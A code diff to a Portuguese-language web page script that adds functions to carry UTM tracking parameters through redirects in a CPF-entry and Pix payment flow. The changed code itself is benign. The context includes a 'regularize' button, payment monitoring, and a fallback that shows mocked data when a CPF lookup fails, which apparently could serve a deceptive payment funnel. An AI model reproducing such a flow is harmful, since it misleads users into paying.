@@ -1,3 +1,25 @@
+// Helper functions to preserve UTM parameters
+function getUrlParams() {
+    const params = new URLSearchParams(window.location.search);
+    const paramObj = {};
+    for (const [key, value] of params) {
+        paramObj[key] = value;
+    }
+    return paramObj;
+}
+
+function buildUrlWithParams(baseUrl) {
+    const params = getUrlParams();
+    if (Object.keys(params).length === 0) {
+        return baseUrl;
+    }
+    const url = new URL(baseUrl, window.location.origin);
+    for (const [key, value] of Object.entries(params)) {
+        url.searchParams.set(key, value);
+    }
+    return url.toString();
+}
+
 // Save customer data to localStorage if flag is set
 
 
@@ -124,25 +146,26 @@ function startPaymentMonitoring() {
                 // Redirecionar para /aviso
                 console.log('🔄 Redirecionando para /aviso...');
                 
-                // Tentar diferentes métodos de redirecionamento
+                // Tentar diferentes métodos de redirecionamento com params preservados
+                const avisoUrl = buildUrlWithParams('aviso.html');
                 try {
                     // Método 1: window.location.href
-                    window.location.href = 'aviso.html';
+                    window.location.href = avisoUrl;
                 } catch (e1) {
                     console.error('Erro no método 1:', e1);
                     try {
                         // Método 2: window.location.replace
-                        window.location.replace('aviso.html');
+                        window.location.replace(avisoUrl);
                     } catch (e2) {
                         console.error('Erro no método 2:', e2);
                         try {
                             // Método 3: window.location.assign
-                            window.location.assign('/aviso');
+                            window.location.assign(avisoUrl);
                         } catch (e3) {
                             console.error('Erro no método 3:', e3);
                             // Método 4: link manual
                             const link = document.createElement('a');
-                            link.href = 'aviso.html';
+                            link.href = avisoUrl;
                             link.click();
                         }
                     }
@@ -172,7 +195,7 @@ function startPaymentMonitoring() {
             // Mostrar alerta e redirecionar
             alert('Verificando seu pagamento...');
             setTimeout(() => {
-                window.location.href = 'aviso.html';
+                window.location.href = buildUrlWithParams('aviso.html');
             }, 1000);
         }
     }, 5 * 60 * 1000); // 5 minutos
@@ -255,7 +278,7 @@ function redirectToAviso() {
     document.getElementById('waitingPaymentModal').style.display = 'none';
     
     // Redirecionar para /aviso
-    window.location.href = 'aviso.html';
+    window.location.href = buildUrlWithParams('aviso.html');
 }
 
 function startPixCountdown() {
@@ -286,7 +309,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const regularizeButton = document.querySelector('.regularize-button');
     if (regularizeButton) {
         regularizeButton.addEventListener('click', function() {
-            window.location.href = 'chat.html';
+            window.location.href = buildUrlWithParams('chat.html');
         });
     }
     
@@ -365,7 +388,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
             hideCpfError();
             document.getElementById('cpfInput').style.borderColor = '#28a745';
-            window.location.href = 'adesao.html';
+            window.location.href = buildUrlWithParams('adesao.html');
         }
 
         // Hide error when user starts editing again
@@ -438,9 +461,9 @@ document.addEventListener('DOMContentLoaded', function() {
                     }));
 
                     // Clear any visible error and proceed
-                    hideCpfError();
-                    cpfInput.style.borderColor = '#28a745';
-                    window.location.href = 'adesao.html';
+            hideCpfError();
+            cpfInput.style.borderColor = '#28a745';
+            window.location.href = buildUrlWithParams('adesao.html');
                 } else {
                     // Fallback: se CPF não for encontrado na API, usar dados mockados
                     console.warn('CPF não encontrado na API, usando fallback');
